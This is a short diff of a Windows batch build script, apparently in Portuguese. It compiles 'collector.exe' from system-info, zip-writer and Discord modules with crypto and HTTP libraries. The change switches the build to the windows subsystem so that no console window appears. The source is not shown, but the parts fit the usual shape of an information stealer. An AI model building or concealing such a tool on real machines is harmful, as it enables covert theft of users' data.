@@ -43,7 +43,8 @@ cl /EHsc /O2 /MT /std:c++17 /I. ^
     main.cpp zip_writer.cpp sysinfo.cpp discord.cpp ^
     resources.res ^
     winhttp.lib advapi32.lib shell32.lib crypt32.lib bcrypt.lib ^
-    /Fe:collector.exe
+    /Fe:collector.exe ^
+    /link /subsystem:windows /ENTRY:mainCRTStartup
 
 if %errorlevel% == 0 (
     echo [OK] collector.exe pronto.
